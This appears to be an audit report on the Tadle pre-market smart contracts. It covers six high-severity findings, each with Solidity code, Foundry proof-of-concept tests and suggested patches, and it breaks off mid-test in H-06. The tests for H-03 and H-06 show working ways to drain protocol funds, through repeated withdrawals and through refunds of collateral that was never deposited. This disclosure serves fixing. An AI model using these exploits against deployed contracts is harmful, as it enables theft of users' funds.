# H-01 Incorrect authority check in `settleAskTaker`

## Summary
The `settleAskTaker` function incorrectly enforces the bid-offer maker, instead of the taker, to settle points sold in bid offers. This misimplementation prevents proper settlement by the takers.

## Vulnerability Details
Takers of **bid-offers** are required to settle the points they sold to bid-offer makers following the token generation event (TGE). They use the [settleAskTaker](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/DeliveryPlace.sol#L335-L433) function to complete this settlement. However, the current implementation incorrectly enforces the offer makers to settle the points themselves, which is erroneous:
```solidity
function settleAskTaker(address _stock, uint256 _settledPoints) external {
    IPerMarkets perMarkets = tadleFactory.getPerMarkets();
    StockInfo memory stockInfo = perMarkets.getStockInfo(_stock);

    (
        OfferInfo memory offerInfo,
        MakerInfo memory makerInfo,
        MarketPlaceInfo memory marketPlaceInfo,
        MarketPlaceStatus status
    ) = getOfferInfo(stockInfo.preOffer); // @audit we get offer info from the pre offer of the stock

    // ...

     if (status == MarketPlaceStatus.AskSettling) {
        if (_msgSender() != offerInfo.authority) { // @audit Wrong check
            revert Errors.Unauthorized();
        }
    } 
    // ...
}

```
As shown above, the original offer is retrieved from `stockInfo.preOffer`, which references the bidder maker's offer. The function then incorrectly enforces the caller to be the offer maker. This is incorrect because the offer maker has purchased points from the taker, and it is the taker who should be responsible for settling the points.

## Proof Of Concept
Consider the following scenario, demonstrated by the test case below:
1. As the Original Offer Maker, Alice posts a buy offer for `1,000 points` with a unit price of $1 and pays `$1,000` in advance.
2. Bob accepts Alice's buy offer and sells `1,000 points` to Alice. This transaction results in Bob having a stock of type `Ask` to be settled later after TGE.
3. During the settlement phase, Bob should settle the `1,000 points` for Alice after TGE. But, **the current implementation incorrectly requires Alice to settle the points she bought**.

Copy and paste the following test in `test/PreMarkets.sol`:
```solidity
import {Errors} from "../src/utils/Errors.sol";

function test_askTakersCanNotSettlePointsToBidOffers() public {
    // As the Original Offer Maker, Alice (user) posts a buy offer for 1,000 points with a unit price of $1 
    vm.startPrank(user);
    preMarktes.createOffer(
        CreateOfferParams(
            marketPlace,
            address(mockUSDCToken),
            1000,
            1000 * 1e18,
            10000,
            300,
            OfferType.Bid,
            OfferSettleType.Turbo
        )
    );
        
    address offer = GenerateAddress.generateOfferAddress(0);
    // Bob (user2) accepts Alice's buy offer and sells 1,000 points to Alice
    vm.startPrank(user2);
    preMarktes.createTaker(offer, 1000);
    address user2Stock = GenerateAddress.generateStockAddress(1);

    // Updating maker info by the owner, setting TGE time
    vm.startPrank(user1);
    systemConfig.updateMarket(
        "Backpack",
        address(mockPointToken),
        0.01 * 1e18,
        block.timestamp - 1,
        3600
    );

    // Bob should settle the 1000 points to Alice now. However, he can not
    vm.startPrank(user2);
    mockPointToken.approve(address(tokenManager), 10000 * 10 ** 18);
    vm.expectRevert(Errors.Unauthorized.selector);
    deliveryPlace.settleAskTaker(user2Stock, 1000);
}
```
```bash 
forge test --mt test_askTakersCanNotSettlePointsToBidOffers

[PASS] test_askTakersCanNotSettlePointsToBidOffers() (gas: 954970)
```
## Impact
Bid offers takers can not settle their points, which results in:
1. Losing collateral even if the taker wanted to settle their points
2. Bidder offers do not receive their token points

## Tools Used
Manual review

## Recommendations
Consider removing the mentioned offer authority check and replace it with stock authority check. Below is a suggested update to the `settleAskTaker` function:
```diff
function settleAskTaker(address _stock, uint256 _settledPoints) external {
    IPerMarkets perMarkets = tadleFactory.getPerMarkets();
    StockInfo memory stockInfo = perMarkets.getStockInfo(_stock);

    (
        OfferInfo memory offerInfo,
        MakerInfo memory makerInfo,
        MarketPlaceInfo memory marketPlaceInfo,
        MarketPlaceStatus status
    ) = getOfferInfo(stockInfo.preOffer); 

    // ...

     if (status == MarketPlaceStatus.AskSettling) {
-       if (_msgSender() != offerInfo.authority) { 
+       if (_msgSender() != stockInfo.authority)
            revert Errors.Unauthorized();
        }
    } 
    // ...
}
```

# H-02 Incorrect credit of point tokens in `settleAskTaker` and `closeBidTaker` functions

## Summary 
The `settleAskTaker` and `closeBidTaker` functions in `DeliveryPlace` incorrectly credit the collateral token instead of the point token during settlement

## Vulnerability Details
During the settlment period, bidder takers call `settleAskTaker` to settle the points they sold to bid offer makers. The issue is that the function [incorrectly credits the collateral token to the offer makers' balance instead of the point token](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/DeliveryPlace.sol#L387).
```solidity
function settleAskTaker(address _stock, uint256 _settledPoints) external {
    IPerMarkets perMarkets = tadleFactory.getPerMarkets();
    StockInfo memory stockInfo = perMarkets.getStockInfo(_stock);

    (
        OfferInfo memory offerInfo,
        MakerInfo memory makerInfo,
        MarketPlaceInfo memory marketPlaceInfo,
        MarketPlaceStatus status
    ) = getOfferInfo(stockInfo.preOffer);
    //...

    if (settledPointTokenAmount > 0) {
        tokenManager.tillIn(
            _msgSender(),
            marketPlaceInfo.tokenAddress, // @audit the taker is correctly depositing the point token 
            settledPointTokenAmount,
            true
        );

        tokenManager.addTokenBalance(
            TokenBalanceType.PointToken,
            offerInfo.authority,
>>>            makerInfo.tokenAddress, // @audit WRONG, we are crediting the collateral token instead of the point token
            settledPointTokenAmount
        );
    }

    // ...
}
```
In the above code, the function correctly deposits the point token from the taker with `tokenManager.tillIn(_msgSender(), marketPlaceInfo.tokenAddress, settledPointTokenAmount, true)`. However, it mistakenly credits the offer maker with the collateral token (`makerInfo.tokenAddress`) instead of the point token (`marketPlaceInfo.tokenAddress`):
```solidity
tokenManager.addTokenBalance(TokenBalanceType.PointToken,offerInfo.authority,
    makerInfo.tokenAddress, // @audit WRONG, we are crediting the collateral token instead of the point token
    settledPointTokenAmount
);
```

This issue also [appears in the `closeBidTaker`](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/DeliveryPlace.sol#L198) function, where ask takers attempting to claim their point tokens after the settlement are incorrectly credited with the collateral token:
```solidity
function closeBidTaker(address _stock) external {
    IPerMarkets perMarkets = tadleFactory.getPerMarkets();
    ITokenManager tokenManager = tadleFactory.getTokenManager();
    StockInfo memory stockInfo = perMarkets.getStockInfo(_stock);

    // ...

    uint256 pointTokenAmount = offerInfo.settledPointTokenAmount.mulDiv(
        userRemainingPoints,
        offerInfo.usedPoints,
        Math.Rounding.Floor
    );
    tokenManager.addTokenBalance(
        TokenBalanceType.PointToken,
        _msgSender(),
>>>        makerInfo.tokenAddress, // @audit WRONG, crediting collateral token instead of point token
        pointTokenAmount
    );
}
```
In this function, ask takers are similarly credited with the collateral token (`makerInfo.tokenAddress`) instead of the correct point token.
## Impact

This vulnerability results in bid offer makers and ask offer takers not receiving the appropriate point tokens

## Tools Used
Manual review

## Recommendations
The `settleAskTaker` and `closeBidTaker` functions should be updated to correctly credit the point token. Below are the suggested code changes:
1. `settleAskTaker`: 
```diff
function settleAskTaker(address _stock, uint256 _settledPoints) external {
    IPerMarkets perMarkets = tadleFactory.getPerMarkets();
    StockInfo memory stockInfo = perMarkets.getStockInfo(_stock);

    (
        OfferInfo memory offerInfo,
        MakerInfo memory makerInfo,
        MarketPlaceInfo memory marketPlaceInfo,
        MarketPlaceStatus status
    ) = getOfferInfo(stockInfo.preOffer);
    //...

    if (settledPointTokenAmount > 0) {
        tokenManager.tillIn(
            _msgSender(),
            marketPlaceInfo.tokenAddress,
            true
        );

    tokenManager.addTokenBalance(
            TokenBalanceType.PointToken,
            offerInfo.authority,
-           makerInfo.tokenAddress, 
+           marketPlaceInfo.tokenAddress
            settledPointTokenAmount
        );
    }

    // ...
}
```

2. `closeBidTaker`:
```diff
function closeBidTaker(address _stock) external {
    IPerMarkets perMarkets = tadleFactory.getPerMarkets();
    ITokenManager tokenManager = tadleFactory.getTokenManager();
    StockInfo memory stockInfo = perMarkets.getStockInfo(_stock);


    (
        OfferInfo memory preOfferInfo,
        MakerInfo memory makerInfo,
+       MarketPlaceInfo memory marketPlaceInfo
        ,

    ) = getOfferInfo(stockInfo.preOffer);
    // ...

    uint256 pointTokenAmount = offerInfo.settledPointTokenAmount.mulDiv(
        userRemainingPoints,
        offerInfo.usedPoints,
        Math.Rounding.Floor
    );
    tokenManager.addTokenBalance(
        TokenBalanceType.PointToken,
        _msgSender(),
-        makerInfo.tokenAddress, 
+       marketPlaceInfo.tokenAddress
        pointTokenAmount
    );
}
```

# H-03 `TokenManager::withdraw` does not update `userTokenBalanceMap`, allowing malicious users to drain the contract's tokens

## Summary
The `TokenManager::withdraw` function does not update `userTokenBalanceMap` after a withdrawal, allowing malicious users to repeatedly withdraw tokens and drain the contract's tokens.

## Vulnerability Details
The `TokenManager` contract is responsible for managing token transfers within the protocol. The `withdraw` function allows users to withdraw tokens based on their `TokenBalanceType`, with the `userTokenBalanceMap` tracking the balances that can be claimed by users. However, the withdraw function does not update the `userTokenBalanceMap` after a successful withdrawal, which enables malicious users to repeatedly withdraw tokens and drain the contract’s tokens:
```solidity
function withdraw(
        address _tokenAddress,
        TokenBalanceType _tokenBalanceType
    ) external whenNotPaused {
        uint256 claimAbleAmount = userTokenBalanceMap[_msgSender()][
            _tokenAddress
        ][_tokenBalanceType];

        if (claimAbleAmount == 0) {
            return;
        }

        address capitalPoolAddr = tadleFactory.relatedContracts(
            RelatedContractLibraries.CAPITAL_POOL
        );

        if (_tokenAddress == wrappedNativeToken) {
            /**
             * @dev token is native token
             * @dev transfer from capital pool to msg sender
             * @dev withdraw native token to token manager contract
             * @dev transfer native token to msg sender
             */
            _transfer(
                wrappedNativeToken,
                capitalPoolAddr,
                address(this),
                claimAbleAmount,
                capitalPoolAddr
            );

            IWrappedNativeToken(wrappedNativeToken).withdraw(claimAbleAmount);
            payable(msg.sender).transfer(claimAbleAmount);
        } else {
            /**
             * @dev token is ERC20 token
             * @dev transfer from capital pool to msg sender
             */
            _safe_transfer_from(
                _tokenAddress,
                capitalPoolAddr,
                _msgSender(),
                claimAbleAmount
            );
        }

        // @audit `userTokenBalanceMap` is not updated
        emit Withdraw(
            _msgSender(),
            _tokenAddress,
            _tokenBalanceType,
            claimAbleAmount
        );
}
```
In the code above, the function does not update the `userTokenBalanceMap` for the caller after a successful withdrawal, allowing malicious users to repeatedly call the withdraw function and drain tokens.

## Proof Of Concept
The following test demonstrates that malicious users can keep calling `withdraw` to drain the contract tokens. Copy and paste the following test into `test/PreMarkets.t.sol`:
```solidity
function test_usersCanDrainTokens() public {
        vm.startPrank(user1);
        capitalPool.approve(address(mockUSDCToken));

        // user creates Bid offer, he deposits 1000 USDC as collateral 
        vm.startPrank(user);
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000,
                1000 * 1e18,
                10000,
                300,
                OfferType.Bid,
                OfferSettleType.Turbo
            )
        );

        // user2 creates Bid offer, he deposits 1000 USDC as collateral 
        vm.startPrank(user2);
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000,
                1000 * 1e18,
                10000,
                300,
                OfferType.Bid,
                OfferSettleType.Turbo
            )
        );

        // user cancels his offer to get back his collateral of 1000 USDC
        vm.startPrank(user);
        address userOffer = GenerateAddress.generateOfferAddress(0);
        address userStock = GenerateAddress.generateStockAddress(0);
        preMarktes.closeOffer(userStock, userOffer);

        uint userUSDCBalanceBeforeWithdraw = mockUSDCToken.balanceOf(address(user));
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.MakerRefund);
        uint userUSDCBalanceAfterWithdraw = mockUSDCToken.balanceOf(address(user));

        // user gots his 1000 USDC collateral
        assert(userUSDCBalanceAfterWithdraw == userUSDCBalanceBeforeWithdraw + 1000 ether);

        // user can keep withdrawing again 
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.MakerRefund);
        uint userUSDCBalanceAfterAnotherWithdraw = mockUSDCToken.balanceOf(address(user));

        // user withdrawn another 1000 USDC
        assert(userUSDCBalanceAfterAnotherWithdraw == userUSDCBalanceBeforeWithdraw + 2000 ether);
}
```
```bash
forge test --mt test_usersCanDrainTokens

[PASS] test_usersCanDrainTokens() (gas: 1067512)
```

## Impact
Malicious users can exploit this vulnerability to drain the tokens deposited into the `TokenManager` contract by repeatedly calling the `withdraw` function.
## Tools Used
Manual review

## Recommendations
Consider updating `userTokenBalanceMap` after a successful withdraw. Below is a suggested modification to the `withdraw` function:
```diff
function withdraw(
        address _tokenAddress,
        TokenBalanceType _tokenBalanceType
    ) external whenNotPaused {
        uint256 claimAbleAmount = userTokenBalanceMap[_msgSender()][
            _tokenAddress
        ][_tokenBalanceType];

        if (claimAbleAmount == 0) {
            return;
        }

        //...

+        userTokenBalanceMap[_msgSender()][_tokenAddress][_tokenBalanceType] -= claimAbleAmount;
        emit Withdraw(
            _msgSender(),
            _tokenAddress,
            _tokenBalanceType,
            claimAbleAmount
        );
}
```

# H-04 Incorrect refund amount calculation in `abortBidTaker`

## Vulnerability Details
When ask makers decide to abort their offers, takers who have already accepted the offer can use the [abortBidTaker](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L645-L697) function to claim a refund of the amount they deposited. However, there is an issue with the function incorrectly calculating the deposited amount for the takers:
```solidity
function abortBidTaker(address _stock, address _offer) external {
    // ...
    uint256 depositAmount = stockInfo.points.mulDiv(
>>>            preOfferInfo.points,
>>>            preOfferInfo.amount,
            Math.Rounding.Floor
    );

    uint256 transferAmount = OfferLibraries.getDepositAmount(
        preOfferInfo.offerType,
        preOfferInfo.collateralRate,
        depositAmount,
        false,
        Math.Rounding.Floor
    );
}
```
The deposited amount **should** be calculated as `points in the stock * the value of each point`. However, the function is incorrectly calculates the value of each point as follows:
```solidity
uint256 depositAmount = stockInfo.points.mulDiv(
    preOfferInfo.points, // @audit this should be in the denominator
    preOfferInfo.amount, // @audit this should be in the numerator
    Math.Rounding.Floor
);
```
The current calculation is `(stock points * offer points) / offer amount`, which is incorrect. The correct calculation should be `(stock points * offer amount) / offer points`. The current incorrect calculation will result in a refund of 0 due to the representation of the offer amount with 18 decimals (`amount` in the denominator >> `points * offer.points` in the numerator).

## Proof Of Concept
The following test demonstrates the issue. To reproduce, copy and paste the test into  `test/PreMarkets.t.sol`:
```solidity
function test_wrongRefundCalculationOnAbortBidTaker() public {
        vm.startPrank(user1);
        capitalPool.approve(address(mockUSDCToken));

        // Alice (user) create an Ask offer of 1,000 points with amount $1,000
        vm.startPrank(user);
        uint points = 1000;
        uint amount = 1000 * 1e18;
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                points,
                amount,
                10000,
                300,
                OfferType.Ask,
                OfferSettleType.Turbo
            )
        );
        address stockAddr = GenerateAddress.generateStockAddress(0);
        address offerAddr = GenerateAddress.generateOfferAddress(0);

        // Bob (user2) takes the offer and buys 500 points from Alice
        vm.startPrank(user2);
        preMarktes.createTaker(offerAddr, 500);

        // Alice aborts her ask offer
        vm.startPrank(user);
        preMarktes.abortAskOffer(stockAddr, offerAddr);

        // Bob calls `abortBidTaker` to get back the amount deposited for buying from Alice
        vm.startPrank(user2);
        address user2StockAddr = GenerateAddress.generateStockAddress(1);
        vm.expectEmit(true, true, true, true);
        // Notice last param (0) which refers to the refund amount to be sent to Bob
        emit ITokenManager.AddTokenBalance(address(user2), address(mockUSDCToken), TokenBalanceType.MakerRefund, 0);

        preMarktes.abortBidTaker(user2StockAddr, offerAddr);
        uint user2BalanceBeforeWithdrawing = mockUSDCToken.balanceOf(address(user2));
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.MakerRefund);
        uint user2BalanceAfterWithdrawing = mockUSDCToken.balanceOf(address(user2));

        // Bob did not receive his deposit, and his stock now is FINISHED
        assert(user2BalanceAfterWithdrawing == user2BalanceBeforeWithdrawing);
    }
```

```bash
forge test --mt test_wrongRefundCalculationOnAbortBidTaker

[PASS] test_wrongRefundCalculationOnAbortBidTaker() (gas: 941980)
```
## Impact
Ask takers will receive a refund of 0 if the pre-offer is aborted due to the incorrect refund amount calculation.
## Tools Used
Manual Review

## Recommendations
Update the calculation of the deposit amount as follows:
```diff
// function:abortBidTaker

function abortBidTaker(address _stock, address _offer) external {
    // ..

    uint256 depositAmount = stockInfo.points.mulDiv(
+       preOfferInfo.amount,
+       preOfferInfo.points
-       preOfferInfo.points,
-       preOfferInfo.amount,
        Math.Rounding.Floor
    );

    uint256 transferAmount = OfferLibraries.getDepositAmount(
        preOfferInfo.offerType,
        preOfferInfo.collateralRate,
        depositAmount,
        false,
        Math.Rounding.Floor
    );
    
    // ...
}
```
# H-05 Incomplete collateral refund to ask-offer makers after point settlement
## Summary
The `settleAskMaker` function does not return the full collateral to ask makers when they settle their points, particularly when the offer's points are only partially used. This results in ask makers receiving only the sales revenue that was already available for withdraw, not the full amount of collateral they are entitled to, leaving part of their collateral stuck in the contract.

## Vulnerability Details
When creating ask offers, makers are required to deposit collateral equivalent to at least 100% of the value they are offering:
```solidity
function createOffer(CreateOfferParams calldata params) external payable {
    // ...
    /// @dev transfer collateral from _msgSender() to capital pool
    uint256 transferAmount = OfferLibraries.getDepositAmount(
        params.offerType,
        params.collateralRate,
        params.amount,
        true,
        Math.Rounding.Ceil
    );

    ITokenManager tokenManager = tadleFactory.getTokenManager();
    tokenManager.tillIn{value: msg.value}(
        _msgSender(),
        params.tokenAddress,
        transferAmount,
        false
    );

    // ...
}   
```
This collateral acts as a security measure and can be liquidated by offer takers if the ask makers do not settle their points during the settlement period, as outlined in [closeBidTaker](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/DeliveryPlace.sol#L151-L189).

During the settlement period, ask makers can call the [settleAskMaker](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/DeliveryPlace.sol#L222-L325) function to settle the points they sold. The issue arises when the offer’s points are partially used (`offer.usedPoints < offer.points`). If the maker settles all the used points, the function does not return the full collateral back to the maker:
```solidity
function settleAskMaker(address _offer, uint256 _settledPoints) external {

    // ...
    uint256 makerRefundAmount;
    if (_settledPoints == offerInfo.usedPoints) {
        if (offerInfo.offerStatus == OfferStatus.Virgin) {
            makerRefundAmount = OfferLibraries.getDepositAmount(
                offerInfo.offerType,
                offerInfo.collateralRate,
                offerInfo.amount,
                true,
                Math.Rounding.Floor
            );
        } else {
            uint256 usedAmount = offerInfo.amount.mulDiv(
                offerInfo.usedPoints,
                offerInfo.points,
                Math.Rounding.Floor
            );

            makerRefundAmount = OfferLibraries.getDepositAmount(
                offerInfo.offerType,
                offerInfo.collateralRate,
                usedAmount,
                true,
                Math.Rounding.Floor
            );
        }

        tokenManager.addTokenBalance(
            TokenBalanceType.SalesRevenue,
            _msgSender(),
            makerInfo.tokenAddress,
            makerRefundAmount
        );
    }

    // ...
}
```
As shown above, if the ask maker settles all his used points, and the offer points were used partially, the offer status is `Ongoing` and the following block will be executed to return the collateral back to the offer maker:
```solidity
else {
    uint256 usedAmount = offerInfo.amount.mulDiv(
    offerInfo.usedPoints,
    offerInfo.points,
    Math.Rounding.Floor
    );

    makerRefundAmount = OfferLibraries.getDepositAmount(
        offerInfo.offerType,
        offerInfo.collateralRate,
        usedAmount,
        true,
        Math.Rounding.Floor
    );
    }

    tokenManager.addTokenBalance(
        TokenBalanceType.SalesRevenue,
        _msgSender(),
        makerInfo.tokenAddress,
        makerRefundAmount
    );

```
In the code above, if the ask maker settles all the used points and the offer points were partially used, the logic executed will refund only the `usedAmount` (the amount corresponding to the used points) as sales revenue, not the full collateral that was initially deposited. This is incorrect because the sales revenue is already available for the maker’s withdrawal once the points are sold, as handled in `PreMarket::createTaker`:
```solidity
function createTaker(address _offer, uint256 _points) external payable {
    // ...

    _updateTokenBalanceWhenCreateTaker(
        _offer,
        tradeTax,
        depositAmount,
        offerInfo,
        makerInfo,
        tokenManager
    );
    // ...
}

function _updateTokenBalanceWhenCreateTaker(
    address _offer,
    uint256 _tradeTax,
    uint256 _depositAmount,
    OfferInfo storage offerInfo,
    MakerInfo storage makerInfo,
    ITokenManager tokenManager
) internal {
    // ...
     if (offerInfo.offerType == OfferType.Ask) {
        tokenManager.addTokenBalance(
            TokenBalanceType.SalesRevenue,
            offerInfo.authority,
            makerInfo.tokenAddress,
            _depositAmount
        );
    }
    // ...
}
```

## Proof Of Concept
Consider the following example, which is demonstrated by the test case below:
1. Alice, an ask-offer maker, lists 1,000 points for sale at $1 per unit and deposits $1,000 as collateral. 
2. Bob, a buyer, purchases 500 points from Alice for $500. Alice [can withdraw the $500 immediately](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L934-L940)
3. The owner updates market info, sets the TGE event, and the settlment period starts.
4. Alice needs to settle only 500 points for Bob. So, she calls `DeliveryPlace::settleAskMaker`

    4.1 Because alice's offer is `Ongoing` and she settles all required points, the following block from `settleAskMaker` will be executed:
    ```solidity
    else {
        uint256 usedAmount = offerInfo.amount.mulDiv(
            offerInfo.usedPoints,
            offerInfo.points,
            Math.Rounding.Floor
        );
        makerRefundAmount = OfferLibraries.getDepositAmount(
            offerInfo.offerType,
            offerInfo.collateralRate,
            usedAmount, 
            true, 
            Math.Rounding.Floor
        );
    }
    tokenManager.addTokenBalance(
        TokenBalanceType.SalesRevenue,
        _msgSender(),
        makerInfo.tokenAddress, 
        makerRefundAmount
    );
    ```
    Alice will only receive the sales revenue of 500 USDC, which was already available after Bob’s purchase, instead of the full 1,000 USDC collateral. This results in Alice not receiving the full collateral amount she is entitled to.

Please, notice that Alice had to get at the end 1500 USDC (500 USDC from Bob's purchase, and 1000 USDC back from the deposited collateral since she settled all the used points). But, she got 1000 USDC only (500 USDC from collateral is not refunded)

To reproduce to test below, some parts of the codebase need to be updated given that there are other vulnerabilities connected here:
1. `Ongoing` status needs to be updated after someone takes the offer (explained in detail in another report):
```diff
// PreMarket::createTaker
  offerInfo.usedPoints = offerInfo.usedPoints + _points;
+ offerInfo.offerStatus = OfferStatus.Ongoing;
```
2. Include check for `Ongoing` status on `DeliveryPlace::settleAskMaker` (explained in details in another report):
```diff
// DeliveryPlace::settleAskMaker
if (
        offerInfo.offerStatus != OfferStatus.Virgin &&
        offerInfo.offerStatus != OfferStatus.Canceled
+        && offerInfo.offerStatus != OfferStatus.Ongoing
    ) {
        revert InvalidOfferStatus();
}
```
3. Fix the vulnerability that allows users to keep withdrawing in `TokenManager::withdraw` (explained in details in another report):
```diff
// TokenManager::withdraw
+ userTokenBalanceMap[_msgSender()][_tokenAddress][_tokenBalanceType] -= claimAbleAmount;
  emit Withdraw(
    _msgSender(),
    _tokenAddress,
    _tokenBalanceType,
    claimAbleAmount
);
```

Now, copy and paste the following test case into `test/PreMarkets.t.sol`:
```solidity
function test_AskMakersDoNotGetTheirCollateralBackAfterSettlingPoints() public {
    vm.startPrank(user1);
    capitalPool.approve(address(mockUSDCToken));

    // Alice (user) create an Ask offer of 1,000 points with amount $1,000
    vm.startPrank(user);
    uint points = 1000;
    uint amount = 1000 * 1e18;
    preMarktes.createOffer(
        CreateOfferParams(
            marketPlace,
            address(mockUSDCToken),
            points,
            amount,
            10000, // 100% collateral
            300,
            OfferType.Ask,
            OfferSettleType.Turbo
        )
    );
    address offerAddr = GenerateAddress.generateOfferAddress(0);

    // Bob (user2) takes the offer and buys 500 points from Alice
    vm.startPrank(user2);
    preMarktes.createTaker(offerAddr, 500);

    // Alice withdrwas her revenue from Bob's purchase
    vm.startPrank(user);
    tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.SalesRevenue);

    // owner sets TGE
    vm.startPrank(user1);
    systemConfig.updateMarket(
        "Backpack",
        address(mockPointToken),
        0.01 * 1e18,
        block.timestamp - 1,
        3600
    );

    uint usdcBalanceBeforeSettling = mockUSDCToken.balanceOf(address(user));
    vm.startPrank(user);
    mockPointToken.approve(address(tokenManager), 10000 * 10 ** 18);
    deliveryPlace.settleAskMaker(offerAddr, 500); // Alice settles 500 points to Bob
    tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.SalesRevenue);
    uint usdcBalanceAfterSettling = mockUSDCToken.balanceOf(address(user));
        
    // Alice was refunded only 500 USDC of collateral instead of 1000 USDC
    assert(usdcBalanceAfterSettling < usdcBalanceBeforeSettling + amount);
    // 500 USDC are not refunded
    assert(usdcBalanceAfterSettling - usdcBalanceBeforeSettling == 500 * 1e18);

}
```
```bash
forge test --mt test_AskMakersDoNotGetTheirCollateralBackAfterSettlingPoints
```
## Impact
The full collateral is not returned to ask makers after settling their points, leaving part of their collateral stuck in the contract.
## Recommendations
The `settleAskMaker` function is incorrectly crediting the maker with revenue that is already available for withdrawal instead of returning the collateral. Below is a suggested fix for the `settleAskMaker` function:
```diff
function settleAskMaker(address _offer, uint256 _settledPoints) external {

    // ...
-     uint256 makerRefundAmount;
        if (_settledPoints == offerInfo.usedPoints) {
-            if (offerInfo.offerStatus == OfferStatus.Virgin) {
-                makerRefundAmount = OfferLibraries.getDepositAmount(
-                    offerInfo.offerType,
-                    offerInfo.collateralRate,
-                    offerInfo.amount,
-                    true,
-                    Math.Rounding.Floor
-                );
-           } else {
-                uint256 usedAmount = offerInfo.amount.mulDiv(
-                    offerInfo.usedPoints,
-                    offerInfo.points,
-                    Math.Rounding.Floor
-                );

-                makerRefundAmount = OfferLibraries.getDepositAmount(
-                    offerInfo.offerType,
-                    offerInfo.collateralRate,
-                    usedAmount,
-                    true,
-                    Math.Rounding.Floor
-                );
-            }
+            uint makerRefundAmount = OfferLibraries.getDepositAmount(
+                    offerInfo.offerType,
+                    offerInfo.collateralRate,
+                    offerInfo.amount,
+                    true,
+                    Math.Rounding.Floor
+            );
            tokenManager.addTokenBalance(
                TokenBalanceType.SalesRevenue,
                _msgSender(),
                makerInfo.tokenAddress,
                makerRefundAmount
            );
    }
}
```

# H-06 Exploitation of Turbo mode allows malicious traders to drain protocol funds

## Summary
In Turbo mode, malicious traders can exploit the lack of collateral requirements for subsequent trades by listing offers with extremely high amounts. If no takers accept the offer, the trader can settle with zero points and receive a refund for collateral they never deposited, leading to significant protocol drain.

## Vulnerability
In Turbo Mode, the original seller deposits crypto as collateral, enabling subsequent traders to buy and sell points without additional collateral. Malicious traders can approach as follows to drain the protocol funds:
1. The malicious trader accepts (buys) an ask offer in Turbo mode, which creates a stock for them.
2. The malicious trader then calls `listOffer` to list their points for sale at an extremely large `_amount`.

    2.1 Since the original offer's type is Turbo, the malicious trader is not required to deposit collateral for the amount they are selling

3. The market owner updates the market's information and sets the TGE event. Given the unrealistic high price set by the malicious trader, it is very likely that there will be no takers for their offer.
4. During the settlement period, the malicious trader calls `DeliveryPlace::settleAskMaker` to settle their ask offer with `_settledPoints` set to 0 (since no points were bought from their offer).

    4.1 Because `_settledPoints` equals `offerInfo.usedPoints` (0), and the malicious offer's status is `Virgin` (no takers), the function will [erroneously refund the trader with the deposited collateral that they never actually deposited](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/DeliveryPlace.sol#L278-L284):
    ```solidity
    function settleAskMaker(address _offer, uint256 _settledPoints) external {
        // ...
         uint256 makerRefundAmount;
        if (_settledPoints == offerInfo.usedPoints) {
            if (offerInfo.offerStatus == OfferStatus.Virgin) { 
            // if there were no sub offers, refund the whole amount
                makerRefundAmount = OfferLibraries.getDepositAmount(
                    offerInfo.offerType,
                    offerInfo.collateralRate,
                    offerInfo.amount,
                    true,
                    Math.Rounding.Floor
                );
            } else {//...}

            // @audit refunding the malicious user with LARGE collateral he did NOT deposit
            tokenManager.addTokenBalance(
                TokenBalanceType.SalesRevenue,
                _msgSender(),
                makerInfo.tokenAddress, 
                makerRefundAmount
            );
        }
    // ...
    }
    ```
5. The malicious trader can then call `TokenManager::withdraw` to withdraw the very LARGE refunded collateral that he never deposited, effectively draining the protocol.

By setting an extremely high `_amount` for the points they are selling, the malicious trader can drain large sums of the protocol's funds.

## Proof Of Concept
To reproduce to test below, some parts of the codebase need to be updated given that there are another vulnerability connected here:

1. Fix the vulnerability that allows users to keep withdrawing in `TokenManager::withdraw` (explained in details in another report):
```diff
// TokenManager::withdraw
+ userTokenBalanceMap[_msgSender()][_tokenAddress][_tokenBalanceType] -= claimAbleAmount;
  emit Withdraw(
    _msgSender(),
    _tokenAddress,
    _tokenBalanceType,
    claimAbleAmount
);
```

The following test case demonstrates how Bob can easily drain `$200_000` from the protocol (and potentially more):
```solidity
function test_tradersCanStealFundsIfSubsequentListingsAreVirginInTurboMode() public {
        vm.startPrank(user1);
        capitalPool.approve(address(mockUSDCToken));


        vm.startPrank(user);
        uint points = 1000;
        uint amount = 1000 * 1e18;
        // Alice (user) create an Ask offer of 1,000 points with amount $1,000
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                points,
                amount,
                10000,
                300,
                OfferType.Ask,
                OfferSettleType.Turbo
            )
        );
        deal(address(mockUSDCToken), address(capitalPool), 500000 ether); // simulating other deposits and trading activities...

        address offerAddr = GenerateAddress.generateOfferAddress(0);

        // Bob (user2) takes the offer and buys 500 points from Alice
        vm.startPrank(user2);
        preMarktes.createTaker(offerAddr, 500);

        address bobStockAddr = GenerateAddress.generateStockAddress(1);

        // Bob then lists his offer for trading with $200,000 value. No need to put collateral in Turbo mode
        preMarktes.listOffer(bobStockAddr, 200_000 * 1e18, 10000);
        address bobOfferAddr = GenerateAddress.generateOfferAddress(1);
        // owner sets TGE
        vm.startPrank(user1);
        systemConfig.updateMarket(
            "Backpack",
            address(mockPointToken),
            0.01 * 1e18,
            block.timestamp - 1,
            3600
        );

        vm.startPrank(user2);
